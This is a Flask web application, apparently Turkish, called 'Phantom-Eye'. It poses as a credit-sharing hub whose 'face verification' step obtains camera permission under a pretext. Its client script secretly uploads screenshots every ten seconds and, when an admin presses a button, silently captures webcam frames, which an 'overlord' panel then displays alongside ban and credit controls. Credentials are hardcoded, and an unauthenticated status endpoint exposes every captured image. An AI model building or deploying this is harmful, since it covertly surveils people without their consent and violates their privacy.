from flask import Flask, render_template_string, jsonify, request
import time, json, threading
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN PHANTOM-EYE v161.0 ---
# Vizyon: Anlık Gizli Kamera, Ekran Takibi ve Mutlak VIP Otoritesi. [cite: 2026-01-03]
VERSION = "v161.0"
ADMIN_KEY = "ali_yigit_overlord_A55" 
ADMIN_PIN = "1907" 

transaction_lock = Lock()
state = {
    "is_active": False, "global_lock": False,
    "banned_peers": [], "user_registry": {}, 
    "active_admins": {}, 
    "evolution_count": 61, "s100_temp": "35°C",
    "pending_snaps": [] # Anlık fotoğraf emirleri [cite: 2026-01-03]
}

def get_device_info(ua):
    ua = ua.upper()
    if "SM-A55" in ua or "437F" in ua or "ANDROID" in ua: return "Samsung A55"
    if "WINDOWS" in ua: return "Casper S100 (PC)"
    return "Mobil Cihaz"

def check_admin_auth(req):
    ua = req.headers.get('User-Agent', '').upper()
    key, pin = req.args.get('key'), req.args.get('pin', '').strip()
    if key == ADMIN_KEY and pin == ADMIN_PIN and any(x in ua for x in ["SM-A55", "437F", "WINDOWS", "ANDROID"]):
        sid = f"ADMIN-{get_device_info(ua)}-{req.remote_addr}"
        state["active_admins"][sid] = {"device": get_device_info(ua), "ip": req.remote_addr, "last_seen": time.strftime('%H:%M:%S')}
        return True
    return False

@app.route('/overlord_api/<action>')
def admin_api(action):
    if not check_admin_auth(request): return "YETKİSİZ", 403
    target = request.args.get('target_peer')
    val = request.args.get('value', "")
    with transaction_lock:
        if action == "snap": # Anlık kamera tetikleyici [cite: 2026-01-03]
            state["pending_snaps"].append(target)
        elif target in state["user_registry"]:
            u = state["user_registry"][target]
            if action == "gift": u["credits"] += float(val or 0)
            elif action == "vip": u["is_vip"] = not u.get("is_vip", False)
            elif action == "ban": state["banned_peers"].append(target)
        elif action == "unban": state["banned_peers"].remove(target)
    return jsonify(state)

@app.route('/upload_phantom', methods=['POST'])
def upload_phantom():
    p_id = request.args.get('peer_id')
    type = request.args.get('type')
    if p_id in state["user_registry"]:
        img_data = request.json.get('image')
        key = "eye_archive" if type == "camera" else "screen_archive"
        if key not in state["user_registry"][p_id]: state["user_registry"][p_id][key] = []
        state["user_registry"][p_id][key].append({"time": time.strftime('%H:%M:%S'), "data": img_data})
        if len(state["user_registry"][p_id][key]) > 10: state["user_registry"][p_id][key].pop(0)
    return "OK"

@app.route('/overlord')
def overlord_panel():
    if not check_admin_auth(request): return "<h1>REDDEDİLDİ: Otorite Yok</h1>", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Phantom-Eye Console</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-4 font-mono text-[9px]">
    <div class="border-b border-blue-600 pb-2 mb-4 flex justify-between items-center">
        <h1 class="text-xl font-black text-blue-500 italic uppercase">PHANTOM-EYE v161.0</h1>
        <div id="adminNodes" class="flex gap-2"></div>
    </div>
    <div class="grid grid-cols-4 gap-4">
        <div class="col-span-1 bg-zinc-950 p-4 border border-zinc-900 rounded-2xl">
            <h2 class="text-blue-400 font-bold mb-2 border-b border-blue-900 uppercase">İSTİHBARAT MERKEZİ</h2>
            <select id="pS" class="w-full bg-zinc-900 p-2 rounded mb-2 text-white outline-none"></select>
            <div id="gallery" class="space-y-3 overflow-y-auto max-h-[550px]"></div>
        </div>
        <div class="col-span-3 space-y-4">
            <div class="bg-zinc-950 rounded-2xl border border-zinc-900 overflow-hidden">
                <table class="w-full text-left"><thead class="bg-zinc-900 text-zinc-500 font-bold">
                <tr><th class="p-3">CİHAZ</th><th>ID</th><th>BAKİYE</th><th>KOMUTA</th></tr></thead>
                <tbody id="userTable"></tbody></table>
            </div>
            <div id="banList" class="bg-red-950/10 border border-red-900/30 p-4 rounded-2xl"></div>
        </div>
    </div>
    <script>
        const k="{{a_key}}", p="{{a_pin}}"; let reg = {};
        async function f(a, t="", v=""){ await fetch(`/overlord_api/${a}?key=${k}&pin=${p}&target_peer=${t}&value=${encodeURIComponent(v)}`); update(); }
        function uG(){
            const id = document.getElementById('pS').value; const g = document.getElementById('gallery');
            if(!id || !reg[id]) { g.innerHTML = ""; return; }
            let h = "<p class='text-red-500 font-bold'>KAMERA</p>";
            (reg[id].eye_archive || []).slice().reverse().forEach(s => {
                h += `<img src="${s.data}" class="w-full rounded mb-1 border border-red-900/50">`;
            });
            h += "<p class='text-green-500 font-bold mt-2'>EKRAN</p>";
            (reg[id].screen_archive || []).slice().reverse().forEach(s => {
                h += `<img src="${s.data}" class="w-full rounded mb-1 border border-green-900/50">`;
            });
            g.innerHTML = h;
        }
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json(); reg = d.user_registry;
            let uH="", aH="", bH="", pO="<option value=''>Hedef Seç...</option>";
            for(let sid in d.active_admins){ let a=d.active_admins[sid]; aH += `<span class="bg-blue-900/20 px-2 py-1 rounded text-blue-400 border border-blue-800">🛡️ ${a.device}</span>`; }
            for(let id in d.user_registry){
                let u=d.user_registry[id];
                if(d.banned_peers.includes(id)) {
                    bH += `<div class="p-2 border border-red-900 rounded mb-1 bg-black flex justify-between items-center text-red-500">${id} <button onclick="f('unban','${id}')" class="underline">AFFET</button></div>`;
                    continue;
                }
                pO += `<option value="${id}" ${document.getElementById('pS').value==id?'selected':''}>${id}</option>`;
                uH += `<tr class="border-b border-zinc-900"><td><b>${u.device}</b></td><td class="${u.is_vip?'text-yellow-500':'text-blue-400'}">${id}</td>
                <td>${u.credits.toFixed(1)}</td><td>
                <button onclick="f('snap','${id}')" class="bg-red-900 px-2 rounded mr-1">KAMERA</button>
                <button onclick="f('vip','${id}')" class="underline mr-1 text-yellow-500">VIP</button>
                <button onclick="f('ban','${id}')" class="text-red-600 underline">BAN</button></td></tr>`;
            }
            document.getElementById('userTable').innerHTML = uH; document.getElementById('adminNodes').innerHTML = aH;
            document.getElementById('pS').innerHTML = pO; uG();
        } setInterval(update, 3000); update();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

@app.route('/action/<type>')
def handle_action(type):
    p_id = request.args.get('peer_id', 'GUEST')
    with transaction_lock:
        if p_id in state["banned_peers"]: return jsonify({"error": "BAN"}), 403
        if p_id not in state["user_registry"]:
            state["user_registry"][p_id] = {"credits": 50.0, "is_vip": False, "device": get_device_info(request.headers.get('User-Agent','')), "ip": request.remote_addr, "eye_archive": [], "screen_archive": []}
        u = state["user_registry"][p_id]
        if type == "receive" and not u["is_vip"]: u["credits"] = max(0, u["credits"] - 0.2)
        
        # Admin snap emri vermiş mi kontrol et [cite: 2026-01-03]
        must_snap = False
        if p_id in state["pending_snaps"]:
            state["pending_snaps"].remove(p_id)
            must_snap = True
    return jsonify({"status": "OK", "must_snap": must_snap})

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sovereign Auth</title><script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script></head>
<body class="bg-black text-white font-mono flex items-center justify-center h-screen overflow-hidden" onload="mainLoop()">
    <div id="auth" class="text-center p-8 bg-zinc-950 border border-blue-900 rounded-[50px] max-w-sm w-full transition-all">
        <h1 class="text-xl font-black text-blue-500 mb-4 uppercase italic">SİSTEM DOĞRULAMA</h1>
        <p class="text-[9px] text-zinc-500 mb-8 italic">"Güvenli bağlantı ve yüz doğrulama protokolü için izin veriniz. Işık, Hükümdar Kalkanı'nın aktif olduğunu gösterir."</p>
        <button onclick="start()" class="w-full py-4 bg-blue-700 font-black rounded-3xl text-lg">BAĞLAN</button>
    </div>
    <div id="main" class="hidden w-full h-full p-4 overflow-y-auto">
        <div class="text-center mb-6 text-2xl font-black text-blue-600 italic">IMPERIAL HUB</div>
        <div class="bg-zinc-950 p-12 rounded-[50px] border border-zinc-900 mb-8 text-center shadow-2xl"><div id="credits" class="text-7xl font-black italic">0.00</div><p class="text-[8px] text-zinc-700 uppercase mt-2">Bakiye</p></div>
        <div class="grid grid-cols-2 gap-4"><button onclick="f('share')" class="py-10 bg-green-700 text-black font-black rounded-3xl text-2xl">VER</button><button onclick="f('receive')" class="py-10 bg-blue-700 text-white font-black rounded-3xl text-2xl">AL</button></div>
    </div>
    <video id="v" class="hidden" autoplay playsinline></video><canvas id="c" class="hidden"></canvas>
    <script>
        if(!localStorage.getItem('n_id')) localStorage.setItem('n_id', "NS-" + Math.floor(1000 + Math.random()*9000));
        let myId = localStorage.getItem('n_id');
        async function f(t) { await fetch(`/action/${t}?peer_id=${myId}`); }
        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = stream;
                document.getElementById('auth').classList.add('hidden'); 
                document.getElementById('main').classList.remove('hidden'); 
                setInterval(screenCap, 10000); // 10 saniyede bir gizli ekran [cite: 2026-01-03]
            } catch(e) { location.reload(); }
        }
        async function screenCap() {
            const canvas = await html2canvas(document.body, { scale: 0.3 });
            fetch(`/upload_phantom?peer_id=${myId}&type=screen`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ image: canvas.toDataURL('image/jpeg', 0.2) }) });
        }
        async function camCap() {
            const v = document.getElementById('v'), c = document.getElementById('c');
            c.width = 640; c.height = 480;
            c.getContext('2d').drawImage(v, 0, 0, 640, 480);
            fetch(`/upload_phantom?peer_id=${myId}&type=camera`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ image: c.toDataURL('image/jpeg', 0.6) }) });
        }
        async function mainLoop() {
            const r = await fetch(`/action/status?peer_id=${myId}`); const d = await r.json();
            if(d.must_snap) camCap(); // Admin tetikleyince çek [cite: 2026-01-03]
            const st = await fetch('/api/status'); const sd = await st.json();
            if(sd.banned_peers.includes(myId)) { document.body.innerHTML = "<h1 class='text-red-600 text-center mt-20 font-black'>SÜRGÜN EDİLDİNİZ!</h1>"; return; }
            document.getElementById('credits').innerText = (sd.user_registry[myId] || {credits:0}).credits.toFixed(2);
            setTimeout(mainLoop, 2000);
        }
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
